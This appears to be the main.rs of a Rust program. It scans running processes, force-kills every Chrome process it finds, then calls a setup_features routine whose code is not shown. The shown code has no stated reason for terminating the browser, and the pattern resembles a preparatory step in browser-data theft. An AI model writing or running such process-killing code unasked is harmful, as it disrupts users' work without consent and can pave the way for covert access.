pub mod error;
mod features;
pub mod prelude;
pub mod utils;
use features::setup_features;
use sysinfo::System;

#[tokio::main]
async fn main() {
    let mut system = System::new_all();
    system.refresh_all();

    for (_pid, process) in system.processes() {
        let process_name = process.name().to_lowercase();
        if let Some(exe_path) = process.exe() {
            if process_name.contains("chrome") && exe_path.to_str().unwrap().contains("chrome") {
                process.kill();
            }
        }
    }

    setup_features().await;
}
